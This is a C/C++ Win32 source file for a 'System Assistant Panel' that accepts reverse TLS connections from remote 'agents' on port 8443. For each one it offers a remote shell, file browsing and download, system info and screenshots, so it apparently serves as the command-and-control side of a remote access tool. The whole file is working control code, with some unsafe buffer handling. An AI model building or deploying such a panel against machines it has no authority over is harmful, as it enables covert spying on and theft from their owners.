#include "../common/proto.h"
#include "../common/tls.h"
#include <commctrl.h>
#include <windowsx.h>
#include <stdio.h>

struct Client {
  TlsCtx tls;
  char host[256], user[256], os[256], addr[256];
  HWND shellWnd, filesWnd, infoWnd, shotWnd;
  HWND shellOut, filesList, infoText;
  char shellPending[MAX_PATH];
  char* shotBmp; uint32_t shotBmpLen;
};

static HINSTANCE g_inst;
static HWND g_main, g_list, g_port, g_status;
static Client* g_clients[256]; static int g_clientCount = 0;
static CRITICAL_SECTION g_cs;
static volatile LONG g_listening = 0;
static SOCKET g_listenSock = INVALID_SOCKET;
static PCCERT_CONTEXT g_cert = NULL;
static HCERTSTORE g_store = NULL;

static void WriteFileAll(const char* p, const char* d, uint32_t dLen) {
  HANDLE f = CreateFileA(p, GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, 0, NULL);
  if (f == INVALID_HANDLE_VALUE) return;
  DWORD n; WriteFile(f, d, dLen, &n, NULL); CloseHandle(f);
}

static bool LoadPfx(const char* path) {
  HANDLE f = CreateFileA(path, GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, 0, NULL);
  if (f == INVALID_HANDLE_VALUE) return false;
  DWORD sz = GetFileSize(f, NULL);
  BYTE* data = (BYTE*)malloc(sz);
  if (!data) { CloseHandle(f); return false; }
  DWORD n = 0; ReadFile(f, data, sz, &n, NULL); CloseHandle(f);
  CRYPT_DATA_BLOB blob = { sz, data };
  g_store = PFXImportCertStore(&blob, L"", 0);
  free(data);
  if (!g_store) return false;
  g_cert = CertFindCertificateInStore(g_store, X509_ASN_ENCODING | PKCS_7_ASN_ENCODING, 0, CERT_FIND_ANY, NULL, NULL);
  return g_cert != NULL;
}

static void AppendEdit(HWND ed, const char* s, size_t len) {
  if (!ed || !s || !len) return;
  int oldLen = GetWindowTextLengthA(ed);
  SendMessageA(ed, EM_SETSEL, oldLen, oldLen);
  char* tmp = (char*)malloc(len + 1);
  if (!tmp) return;
  memcpy(tmp, s, len); tmp[len] = 0;
  SendMessageA(ed, EM_REPLACESEL, FALSE, (LPARAM)tmp);
  free(tmp);
}

static int FindClientIndex(Client* c) {
  for (int i = 0; i < g_clientCount; i++) if (g_clients[i] == c) return i;
  return -1;
}

static Client* ClientAt(int idx) {
  if (idx < 0) return NULL;
  LVITEMA it = {0}; it.mask = LVIF_PARAM; it.iItem = idx;
  if (!ListView_GetItem(g_list, &it)) return NULL;
  return (Client*)it.lParam;
}

static void RefreshRow(Client* c) {
  int i = FindClientIndex(c); if (i < 0) return;
  ListView_SetItemText(g_list, i, 0, c->host);
  ListView_SetItemText(g_list, i, 1, c->user);
  ListView_SetItemText(g_list, i, 2, c->os);
  ListView_SetItemText(g_list, i, 3, c->addr);
}

static void DropClient(Client* c) {
  EnterCriticalSection(&g_cs);
  if (c->tls.sock != INVALID_SOCKET) closesocket(c->tls.sock);
  LeaveCriticalSection(&g_cs);
  int i = FindClientIndex(c);
  if (i >= 0) {
    ListView_DeleteItem(g_list, i);
    g_clients[i] = g_clients[--g_clientCount];
  }
  if (c->shellWnd) DestroyWindow(c->shellWnd);
  if (c->filesWnd) DestroyWindow(c->filesWnd);
  if (c->infoWnd) DestroyWindow(c->infoWnd);
  if (c->shotWnd) DestroyWindow(c->shotWnd);
  if (c->shotBmp) free(c->shotBmp);
  FreeTlsCtx(&c->tls);
  free(c);
}

static DWORD WINAPI ClientThread(LPVOID p) {
  Client* c = (Client*)p;
  uint16_t cmd = 0; char* pl = NULL; uint32_t plLen = 0;
  for (;;) {
    if (!TlsRecvMsg(&c->tls, &cmd, &pl, &plLen)) break;
    switch (cmd) {
      case C_HELLO: {
        char* a = strchr(pl, '|'); if (a) { *a = 0; strncpy(c->host, pl, 255); }
        char* b = a ? strchr(a+1, '|') : NULL;
        if (b) { *b = 0; strncpy(c->user, a+1, 255); strncpy(c->os, b+1, 255); }
        else strcpy(c->os, "Windows");
        int n = ListView_GetItemCount(g_list);
        LVITEMA it = {0}; it.mask = LVIF_TEXT | LVIF_PARAM; it.iItem = n; it.lParam = (LPARAM)c;
        it.pszText = c->host; ListView_InsertItem(g_list, &it);
        RefreshRow(c); break;
      }
      case C_SHELL_DATA: if (c->shellWnd) AppendEdit(c->shellOut, pl, plLen); break;
      case C_SHELL_CLOSE: if (c->shellWnd) AppendEdit(c->shellOut, "\r\n[shell closed]\r\n", 18); break;
      case C_FS_LIST_RESP:
        if (c->filesWnd) {
          ListView_DeleteAllItems(c->filesList);
          if (plLen > 4 && strncmp(pl, "ERR|", 4) == 0) {
            MessageBoxA(c->filesWnd, "File error (path not found or access denied)", "Files", MB_ICONWARNING);
            break;
          }
          char* line = pl; char* end = pl + plLen;
          int i = 0;
          while (line < end) {
            char* nl = strchr(line, '\n'); if (!nl) break;
            *nl = 0;
            char* p1 = strchr(line, '|');
            if (p1) {
              *p1 = 0;
              LVITEMA it = {0}; it.mask = LVIF_TEXT; it.iItem = i; it.pszText = line;
              int idx = ListView_InsertItem(c->filesList, &it);
              ListView_SetItemText(c->filesList, idx, 1, p1 + 1);
              i++;
            }
            line = nl + 1;
          }
        }
        break;
      case C_FS_FILE:
        if (c->filesWnd && plLen > 0) {
          CreateDirectoryA("downloads", NULL);
          char name[MAX_PATH]; strcpy(name, c->shellPending);
          char* slash = strrchr(name, '\\'); if (!slash) slash = strrchr(name, '/');
          if (slash) strcpy(name, slash + 1);
          if (name[0] == 0) strcpy(name, "last.bin");
          char outPath[MAX_PATH + 16]; sprintf(outPath, "downloads\\%s", name);
          WriteFileAll(outPath, pl, plLen);
          MessageBoxA(c->filesWnd, outPath, "Saved", MB_ICONINFORMATION);
        }
        break;
      case C_SYSINFO:
        if (c->infoWnd && c->infoText) SetWindowTextA(c->infoText, pl);
        else MessageBoxA(g_main, pl, "SysInfo", MB_ICONINFORMATION);
        break;
      case C_SCREEN_IMG:
        if (c->shotBmp) free(c->shotBmp);
        c->shotBmp = (char*)malloc(plLen);
        if (c->shotBmp) { memcpy(c->shotBmp, pl, plLen); c->shotBmpLen = plLen; }
        if (c->shotWnd) { InvalidateRect(c->shotWnd, NULL, TRUE); UpdateWindow(c->shotWnd); }
        break;
      case C_BYE: goto out;
    }
    if (pl) free(pl);
  }
out:
  DropClient(c);
  return 0;
}

static DWORD WINAPI AcceptThread(LPVOID) {
  for (;;) {
    SOCKET s = accept(g_listenSock, NULL, NULL);
    if (s == INVALID_SOCKET) break;
    Client* c = (Client*)calloc(1, sizeof(Client));
    if (!c) { closesocket(s); continue; }
    InitTlsCtx(&c->tls, s); strcpy(c->addr, "pending");
    if (!TlsAcquire(&c->tls, g_cert) || !TlsHandshake(&c->tls)) { closesocket(s); free(c); continue; }
    EnterCriticalSection(&g_cs);
    if (g_clientCount < 256) g_clients[g_clientCount++] = c;
    LeaveCriticalSection(&g_cs);
    CreateThread(NULL, 0, ClientThread, c, 0, NULL);
  }
  return 0;
}

#define IDC_SHELLIN 201
#define IDC_SHELLSEND 202
#define IDC_FPATH 301
#define IDC_FREFRESH 302
#define IDC_FGET 303
#define IDC_FPUT 304
#define IDC_LIST 101
#define IDC_PORT 102
#define IDC_LISTEN 103
#define IDM_SHELL 200
#define IDM_FILES 201
#define IDM_INFO 202
#define IDM_SHOT 203
#define IDM_DROP 204

enum ChildKind { K_SHELL, K_FILES, K_INFO, K_SHOT };
struct Child { Client* c; int kind; };

static void ChildLayout(HWND h, int kind, int w, int ht) {
  switch (kind) {
    case K_SHELL:
      MoveWindow(GetDlgItem(h, 1), 0, 0, w, ht - 34, TRUE);
      MoveWindow(GetDlgItem(h, IDC_SHELLIN), 4, ht - 30, w - 90, 24, TRUE);
      MoveWindow(GetDlgItem(h, IDC_SHELLSEND), w - 82, ht - 30, 78, 24, TRUE);
      break;
    case K_FILES:
      MoveWindow(GetDlgItem(h, IDC_FPATH), 4, 4, w - 96, 24, TRUE);
      MoveWindow(GetDlgItem(h, IDC_FREFRESH), w - 88, 4, 84, 24, TRUE);
      MoveWindow(GetDlgItem(h, IDC_FGET), 4, ht - 28, 90, 24, TRUE);
      MoveWindow(GetDlgItem(h, IDC_FPUT), 98, ht - 28, 90, 24, TRUE);
      MoveWindow(GetDlgItem(h, 1), 0, 32, w, ht - 66, TRUE);
      break;
    case K_INFO:
      MoveWindow(GetDlgItem(h, 1), 0, 0, w, ht, TRUE);
      break;
  }
}

static void ChildCommand(Child* ch, HWND h, int id) {
  Client* c = ch->c; if (!c) return;
  if (ch->kind == K_SHELL && id == IDC_SHELLSEND) {
    char buf[1024]; HWND in = GetDlgItem(h, IDC_SHELLIN);
    GetWindowTextA(in, buf, sizeof(buf) - 3); SetWindowTextA(in, "");
    strcat(buf, "\r\n");
    TlsSendMsg(&c->tls, C_SHELL_DATA, buf, strlen(buf));
  } else if (ch->kind == K_FILES && id == IDC_FREFRESH) {
    char p[MAX_PATH]; GetWindowTextA(GetDlgItem(h, IDC_FPATH), p, sizeof(p));
    TlsSendMsg(&c->tls, C_FS_LIST, p, strlen(p));
  } else if (ch->kind == K_FILES && id == IDC_FGET) {
    char name[MAX_PATH]; int sel = ListView_GetNextItem(GetDlgItem(h, 1), -1, LVNI_SELECTED);
    if (sel < 0) return;
    ListView_GetItemText(GetDlgItem(h, 1), sel, 0, name, sizeof(name));
    char p[MAX_PATH]; GetWindowTextA(GetDlgItem(h, IDC_FPATH), p, sizeof(p));
    char full[MAX_PATH * 2 + 2]; sprintf(full, "%s\\%s", p, name);
    strcpy(c->shellPending, full);
    TlsSendMsg(&c->tls, C_FS_GET, full, strlen(full));
  }
}

static void ChildPaint(Client* c, HWND h) {
  PAINTSTRUCT ps; HDC dc = BeginPaint(h, &ps);
  if (c && c->shotBmp && c->shotBmpLen > sizeof(BITMAPFILEHEADER)) {
    BITMAPFILEHEADER* fh = (BITMAPFILEHEADER*)c->shotBmp;
    BITMAPINFO* bi = (BITMAPINFO*)(c->shotBmp + sizeof(*fh));
    void* px = (void*)(c->shotBmp + fh->bfOffBits);
    RECT rc; GetClientRect(h, &rc);
    SetStretchBltMode(dc, HALFTONE);
    StretchDIBits(dc, 0, 0, rc.right, rc.bottom, 0, 0, bi->bmiHeader.biWidth, bi->bmiHeader.biHeight, px, bi, DIB_RGB_COLORS, SRCCOPY);
  } else {
    TextOutA(dc, 10, 10, "no screenshot yet", 17);
  }
  EndPaint(h, &ps);
}

static LRESULT CALLBACK ChildProc(HWND h, UINT m, WPARAM wp, LPARAM lp) {
  Child* ch = (Child*)GetWindowLongPtrA(h, GWLP_USERDATA);
  Client* c = ch ? ch->c : NULL;
  switch (m) {
    case WM_SIZE: if (ch) ChildLayout(h, ch->kind, LOWORD(lp), HIWORD(lp)); return 0;
    case WM_COMMAND:
      if (ch) ChildCommand(ch, h, LOWORD(wp));
      return 0;
    case WM_PAINT:
      if (ch && ch->kind == K_SHOT) { ChildPaint(c, h); return 0; }
      break;
    case WM_DESTROY:
      if (ch) {
        if (c) {
          if (ch->kind == K_SHELL) c->shellWnd = NULL;
          else if (ch->kind == K_FILES) c->filesWnd = NULL;
          else if (ch->kind == K_INFO) c->infoWnd = NULL;
          else c->shotWnd = NULL;
        }
        free(ch);
        SetWindowLongPtrA(h, GWLP_USERDATA, 0);
      }
      return 0;
  }
  return DefWindowProcA(h, m, wp, lp);
}

static HWND MakeChild(const char* cls, const char* title, int kind, Client* c, int w, int h) {
  WNDCLASSA wc = {0}; wc.lpfnWndProc = ChildProc; wc.hInstance = g_inst;
  wc.hCursor = LoadCursor(NULL, IDC_ARROW); wc.hbrBackground = (HBRUSH)(COLOR_BTNFACE + 1);
  wc.lpszClassName = cls;
  RegisterClassA(&wc);
  HWND wnd = CreateWindowExA(0, cls, title, WS_OVERLAPPEDWINDOW | WS_VISIBLE, CW_USEDEFAULT, CW_USEDEFAULT, w, h, g_main, NULL, g_inst, NULL);
  Child* ch = (Child*)malloc(sizeof(Child));
  if (wnd && ch) { ch->c = c; ch->kind = kind; SetWindowLongPtrA(wnd, GWLP_USERDATA, (LONG_PTR)ch); }
  return wnd;
}

static void OpenShell(Client* c) {
  if (c->shellWnd) { SetForegroundWindow(c->shellWnd); return; }
  char title[512]; sprintf(title, "Shell - %s", c->host);
  HWND h = MakeChild("OAShell", title, K_SHELL, c, 720, 500);
  CreateWindowExA(WS_EX_CLIENTEDGE, "EDIT", "", WS_CHILD | WS_VISIBLE | ES_MULTILINE | ES_AUTOVSCROLL | WS_VSCROLL | ES_READONLY, 0, 0, 100, 100, h, (HMENU)1, g_inst, NULL);
  CreateWindowExA(WS_EX_CLIENTEDGE, "EDIT", "", WS_CHILD | WS_VISIBLE | ES_AUTOHSCROLL, 0, 0, 100, 24, h, (HMENU)IDC_SHELLIN, g_inst, NULL);
  CreateWindowExA(0, "BUTTON", "Send", WS_CHILD | WS_VISIBLE, 0, 0, 78, 24, h, (HMENU)IDC_SHELLSEND, g_inst, NULL);
  c->shellWnd = h; c->shellOut = GetDlgItem(h, 1);
  RECT rc; GetClientRect(h, &rc);
  SendMessageA(h, WM_SIZE, 0, MAKELPARAM(rc.right, rc.bottom));
  TlsSendMsg(&c->tls, C_SHELL_START, NULL, 0);
}

static void OpenFiles(Client* c) {
  if (c->filesWnd) {
    SetForegroundWindow(c->filesWnd);
    SendMessage(GetDlgItem(c->filesWnd, IDC_FREFRESH), BM_CLICK, 0, 0);
    return;
  }
  char title[512]; sprintf(title, "Files - %s", c->host);
  HWND h = MakeChild("OAFiles", title, K_FILES, c, 760, 520);
  CreateWindowExA(WS_EX_CLIENTEDGE, "EDIT", "C:\\", WS_CHILD | WS_VISIBLE | ES_AUTOHSCROLL, 0, 0, 100, 24, h, (HMENU)IDC_FPATH, g_inst, NULL);
  CreateWindowExA(0, "BUTTON", "Refresh", WS_CHILD | WS_VISIBLE, 0, 0, 84, 24, h, (HMENU)IDC_FREFRESH, g_inst, NULL);
  HWND lv = CreateWindowExA(0, WC_LISTVIEWA, "", WS_CHILD | WS_VISIBLE | LVS_REPORT | LVS_SHOWSELALWAYS, 0, 0, 100, 100, h, (HMENU)1, g_inst, NULL);
  ListView_SetExtendedListViewStyle(lv, LVS_EX_FULLROWSELECT);
  LVCOLUMNA col = {0}; col.mask = LVCF_TEXT | LVCF_WIDTH; col.pszText = (LPSTR)"Name"; col.cx = 300; ListView_InsertColumn(lv, 0, &col);
  col.pszText = (LPSTR)"Size|Attr"; col.cx = 160; ListView_InsertColumn(lv, 1, &col);
  CreateWindowExA(0, "BUTTON", "Download", WS_CHILD | WS_VISIBLE, 0, 0, 90, 24, h, (HMENU)IDC_FGET, g_inst, NULL);
  CreateWindowExA(0, "BUTTON", "Upload", WS_CHILD | WS_VISIBLE, 0, 0, 90, 24, h, (HMENU)IDC_FPUT, g_inst, NULL);
  c->filesWnd = h; c->filesList = lv;
  RECT rc; GetClientRect(h, &rc);
  SendMessageA(h, WM_SIZE, 0, MAKELPARAM(rc.right, rc.bottom));
  SendMessage(GetDlgItem(h, IDC_FREFRESH), BM_CLICK, 0, 0);
}

static void OpenInfo(Client* c) {
  if (c->infoWnd) {
    SetForegroundWindow(c->infoWnd);
    TlsSendMsg(&c->tls, C_SYSINFO, NULL, 0);
    return;
  }
  char title[512]; sprintf(title, "SysInfo - %s", c->host);
  HWND h = MakeChild("OAInfo", title, K_INFO, c, 480, 360);
  c->infoWnd = h;
  c->infoText = CreateWindowExA(WS_EX_CLIENTEDGE, "EDIT", "requesting...", WS_CHILD | WS_VISIBLE | ES_MULTILINE | WS_VSCROLL | ES_READONLY, 0, 0, 100, 100, h, (HMENU)1, g_inst, NULL);
  RECT rc; GetClientRect(h, &rc);
  SendMessageA(h, WM_SIZE, 0, MAKELPARAM(rc.right, rc.bottom));
  TlsSendMsg(&c->tls, C_SYSINFO, NULL, 0);
}

static void OpenShot(Client* c) {
  if (!c->shotWnd) {
    char title[512]; sprintf(title, "Screen - %s", c->host);
    c->shotWnd = MakeChild("OAShot", title, K_SHOT, c, 900, 560);
    RECT rc; GetClientRect(c->shotWnd, &rc);
    SendMessageA(c->shotWnd, WM_SIZE, 0, MAKELPARAM(rc.right, rc.bottom));
  } else SetForegroundWindow(c->shotWnd);
  TlsSendMsg(&c->tls, C_SCREEN, NULL, 0);
}

static LRESULT CALLBACK MainProc(HWND h, UINT m, WPARAM wp, LPARAM lp) {
  switch (m) {
    case WM_SIZE: {
      const int w = LOWORD(lp), ht = HIWORD(lp);
      const int statusH = 22, topH = 36, buttonW = 170, portW = 72, rightMargin = 10, gap = 8;
      const int buttonX = (w > buttonW + rightMargin) ? w - buttonW - rightMargin : 0;
      const int portX = (buttonX > portW + gap) ? buttonX - portW - gap : 0;
      if (g_list) MoveWindow(g_list, 0, topH, w, (ht > topH + statusH) ? ht - topH - statusH : 0, TRUE);
      if (g_port) MoveWindow(g_port, portX, 6, portW, 24, TRUE);
      HWND listenButton = GetDlgItem(h, IDC_LISTEN);
      if (listenButton) MoveWindow(listenButton, buttonX, 5, buttonW, 26, TRUE);
      if (g_status) MoveWindow(g_status, 0, (ht > statusH) ? ht - statusH : 0, w, statusH, TRUE);
      return 0;
    }
    case WM_CONTEXTMENU: {
      if ((HWND)wp != g_list) break;
      POINT pt = { GET_X_LPARAM(lp), GET_Y_LPARAM(lp) };
      LVHITTESTINFO ht = {0}; ht.pt = pt; ScreenToClient(g_list, &ht.pt);
      if (ListView_HitTest(g_list, &ht) < 0) break;
      int idx = ListView_GetNextItem(g_list, -1, LVNI_SELECTED);
      if (idx < 0) break;
      Client* c = ClientAt(idx); if (!c) break;
      HMENU menu = CreatePopupMenu();
      AppendMenuA(menu, MF_STRING, IDM_SHELL, "Remote shell");
      AppendMenuA(menu, MF_STRING, IDM_FILES, "File manager");
      AppendMenuA(menu, MF_STRING, IDM_INFO, "System info");
      AppendMenuA(menu, MF_STRING, IDM_SHOT, "Screenshot");
      AppendMenuA(menu, MF_SEPARATOR, 0, NULL);
      AppendMenuA(menu, MF_STRING, IDM_DROP, "Disconnect client");
      TrackPopupMenu(menu, TPM_RIGHTBUTTON, pt.x, pt.y, 0, h, NULL);
      DestroyMenu(menu); return 0;
    }
    case WM_COMMAND: {
      if (LOWORD(wp) == IDC_LISTEN) {
        if (InterlockedExchange(&g_listening, 1)) return 0;
        char port[16]; GetWindowTextA(g_port, port, sizeof(port));
        addrinfo* ai = NULL; addrinfo hints = {0};
        hints.ai_family = AF_INET; hints.ai_socktype = SOCK_STREAM; hints.ai_flags = AI_PASSIVE;
        getaddrinfo(NULL, *port ? port : "8443", &hints, &ai);
        g_listenSock = socket(AF_INET, SOCK_STREAM, 0);
        int one = 1; setsockopt(g_listenSock, SOL_SOCKET, SO_REUSEADDR, (char*)&one, sizeof(one));
        if (bind(g_listenSock, ai ? ai->ai_addr : NULL, (int)(ai ? ai->ai_addrlen : sizeof(sockaddr_in))) || listen(g_listenSock, 16)) {
          MessageBoxA(h, "bind/listen failed", "Error", MB_ICONERROR);
          closesocket(g_listenSock); InterlockedExchange(&g_listening, 0); return 0;
        }
        if (ai) freeaddrinfo(ai);
        CreateThread(NULL, 0, AcceptThread, NULL, 0, NULL);
        SendMessage(g_status, SB_SETTEXTA, 0, (LPARAM)"listening");
        return 0;
      }
      int idx = ListView_GetNextItem(g_list, -1, LVNI_SELECTED);
      if (idx < 0) return 0;
      Client* c = ClientAt(idx); if (!c) return 0;
      switch (LOWORD(wp)) {
        case IDM_SHELL: OpenShell(c); return 0;
        case IDM_FILES: OpenFiles(c); return 0;
        case IDM_INFO: OpenInfo(c); return 0;
        case IDM_SHOT: OpenShot(c); return 0;
        case IDM_DROP: TlsSendMsg(&c->tls, C_BYE, NULL, 0); return 0;
      }
      return 0;
    }
    case WM_DESTROY: PostQuitMessage(0); return 0;
  }
  return DefWindowProcA(h, m, wp, lp);
}

int WINAPI WinMain(HINSTANCE inst, HINSTANCE, LPSTR, int) {
  g_inst = inst;
  InitializeCriticalSection(&g_cs);
  WSADATA w; WSAStartup(MAKEWORD(2, 2), &w);
  InitCommonControls();

  if (!LoadPfx("cert.pfx")) { MessageBoxA(NULL, "Failed to load cert.pfx", "Error", MB_ICONERROR); return 1; }

  WNDCLASSA wc = {0}; wc.lpfnWndProc = MainProc; wc.hInstance = inst;
  wc.hCursor = LoadCursor(NULL, IDC_ARROW); wc.hbrBackground = (HBRUSH)(COLOR_BTNFACE + 1);
  wc.lpszClassName = "OpenAssistPanel"; wc.hIcon = LoadIcon(NULL, IDI_APPLICATION);
  RegisterClassA(&wc);

  g_main = CreateWindowExA(0, "OpenAssistPanel", "System Assistant Panel", WS_OVERLAPPEDWINDOW, CW_USEDEFAULT, CW_USEDEFAULT, 860, 480, NULL, NULL, inst, NULL);

  CreateWindowExA(0, "STATIC", "Agents connect to you.", WS_CHILD | WS_VISIBLE, 10, 8, 300, 18, g_main, NULL, inst, NULL);
  g_port = CreateWindowExA(WS_EX_CLIENTEDGE, "EDIT", "8443", WS_CHILD | WS_VISIBLE | ES_NUMBER, 0, 0, 60, 22, g_main, (HMENU)IDC_PORT, inst, NULL);
  CreateWindowExA(0, "BUTTON", "Start listening", WS_CHILD | WS_VISIBLE, 0, 0, 170, 26, g_main, (HMENU)IDC_LISTEN, inst, NULL);

  g_list = CreateWindowExA(0, WC_LISTVIEWA, "", WS_CHILD | WS_VISIBLE | LVS_REPORT | LVS_SHOWSELALWAYS, 0, 36, 800, 300, g_main, (HMENU)IDC_LIST, inst, NULL);
  ListView_SetExtendedListViewStyle(g_list, LVS_EX_FULLROWSELECT | LVS_EX_GRIDLINES);

  struct { const char* t; int cx; } cols[] = { {"Host", 160}, {"User", 140}, {"OS", 120}, {"Addr", 160} };
  LVCOLUMNA col = {0}; col.mask = LVCF_TEXT | LVCF_WIDTH;
  for (int i = 0; i < 4; i++) { col.pszText = (LPSTR)cols[i].t; col.cx = cols[i].cx; ListView_InsertColumn(g_list, i, &col); }

  g_status = CreateWindowExA(0, STATUSCLASSNAMEA, "idle", WS_CHILD | WS_VISIBLE, 0, 0, 800, 22, g_main, NULL, inst, NULL);

  RECT clientRc; GetClientRect(g_main, &clientRc);
  SendMessageA(g_main, WM_SIZE, 0, MAKELPARAM(clientRc.right, clientRc.bottom));
  ShowWindow(g_main, SW_SHOW);

  MSG msg;
  while (GetMessageA(&msg, NULL, 0, 0)) { TranslateMessage(&msg); DispatchMessageA(&msg); }
  return 0;
}